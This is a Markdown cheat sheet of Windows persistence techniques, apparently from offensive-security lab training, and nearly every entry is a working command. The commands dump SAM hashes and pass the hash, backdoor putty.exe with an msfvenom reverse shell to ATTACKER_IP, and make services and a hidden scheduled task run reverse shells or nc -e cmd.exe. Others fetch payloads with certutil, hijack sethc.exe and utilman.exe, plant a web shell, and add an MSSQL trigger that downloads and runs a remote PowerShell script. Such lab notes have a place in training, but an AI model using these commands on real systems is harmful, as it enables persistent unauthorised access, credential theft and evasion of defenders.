# Windows Persistence
## Assign Group Memberships
| Info | Command |
|:-----|:--------|
| Add to local administrators group | `net localgroup administrators user /add` |
| Add to Backup Operators group | `net localgroup "Backup Operators" user /add` | 
| Add to Remote Management User for RDP access | `net localgroup "Remote Management Users" user /add` | 
| disable LocalAccountTokenFilterPolicy (Allows remote admin privileges) | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` |
| Copy system file | `reg save hklm\system system.bak` |
| Copy sam file | `reg save hklm\sam sam.bak` | 
| Dump hashes | `python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL` | 
| Connect with admin hash | `evil-winrm -i $ip -u Administrator -H 1ceasdfasdfasdfs88c4cb4bbdaa3` | 

## Special Privileges and Security Descriptors
| Info | Command |
|:-----|:--------|
| Export current config | `secedit /export /cfg config.inf` | 
| Add 'user' to the SeBackupPrivilege & SeRestorePrivilege in the config file | `((Get-Content .\config.inf -Raw) -replace 'SeBackupPrivilege.*[^\r\n]', '$&,user') -replace 'SeRestorePrivilege.*[^\r\n]', '$&,user' \| Set-Content .\config2.inf` |
| Convert inf file to sdb | `secedit /import /cfg config.inf /db config.sdb` |
| Import configuration | `secedit /configure /db config.sdb /cfg config.inf` | 
| Give user WinRM permissions (Add user account in GUI and set 'Full Control') | `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` |

## RID Hijacking
| Info | Command |
|:-----|:--------|
| List assigned SIDs | `wmic useraccount get name,sid` | 

https://www.ired.team/offensive-security/persistence/rid-hijacking

## Backdooring Files
| Info | Command |
|:-----|:--------|
| Executable Files | `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe` |
| Shortcut Files | Modify the shortcut to run a powershell script which runs a shell then the expected binary |

## Creating backdoor services
| Info | Command |
|:-----|:--------|
| Create a service to reset the admin password | `sc.exe create winservice binPath= "net user Administrator Password123" start= auto` |
| Start the created service | `sc.exe start winservice` | 
| Create a reverse shell for the service with msfvenom | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lport LPORT=$lport -f exe-service -o rev-svc.exe` |
| Create a service to execute the shell | `sc.exe create winservice binPath= "C:\windows\svc.exe" start= auto` |
| Start the created service | `sc.exe start winservice` |

## Modifying existing services
| Info | Command |
|:-----|:--------|
| Query all services | `sc.exe query state=all` |
| Query a specific service | `sc.exe qc winservice` |
| Create a service shell | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe-service -o rev-svc2.exe` |
| Download the shell | `certutil.exe -f -urlcache http://10.8.23.61/rev-svc2.exe rev-svc2.exe` | 
| Modify the service to run the shell | `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"` | 


## Task Scheduler
| Info | Command |
|:-----|:--------|
| Create a scheduled task | `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe $lhost $lport" /ru SYSTEM` | 
| Hide task by deleting the 'SD' key under task in the registry | `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor` | 

## Startup folder
| Info | Command |
|:-----|:--------|
| Run a binary under a user context | `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Run a binary for all users | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` |

## Run / RunOnce
| Info | Command |
|:-----|:--------|
| Run as the current user | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Run only once as the current user | `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | 
| Run as all users | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` |
| Run once as any user | `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` |

## Winlogon
| Info | Command |
|:-----|:--------|
| Replace shell or Userinit registry keys in i.e. change Userinit to 'C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe' | `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` |

## Logon scripts
| Info | Command |
|:-----|:--------|
| Create a REG_EXPAND_SZ key under in registry pointing to the shell binary | `Computer\HKEY_CURRENT_USER\Environment` |

## Sticky Keys
| Info | Command |
|:-----|:--------|
| Take ownership of the file | `takeown /f c:\Windows\System32\sethc.exe` |
| Grant access to the sethc.exe file | `icacls C:\Windows\System32\sethc.exe /grant Administrator:F` |
| Copy cmd.exe over the top of sethc.exe | `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` |

## Utilman
| Info | Command |
|:-----|:--------|
| Take ownership of the file | `takeown /f c:\Windows\System32\utilman.exe` |
| Grant access to the utilman.exe file | `icacls C:\Windows\System32\utilman.exe /grant Administrator:F` |
| Copy cmd.exe over utilman.exe | `copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe` |


## Using Web Shells
| Info | Command |
|:-----|:--------|
| Download a webshell to the web root directory | `certutil.exe -f -urlcache http://10.8.23.61/cmdasp.aspx cmdasp.aspx` |
 
## Using MSSQL as a Backdoor

1. Enable Advanced Options

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
```

2. Enable xp_cmdshell

```sql
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

3. Ensure that any website accessing the database can run xp_cmdshell

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

4. Configure a trigger

```sql
USE HRDB
```

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://$lhost/evilscript.ps1'')"';
```
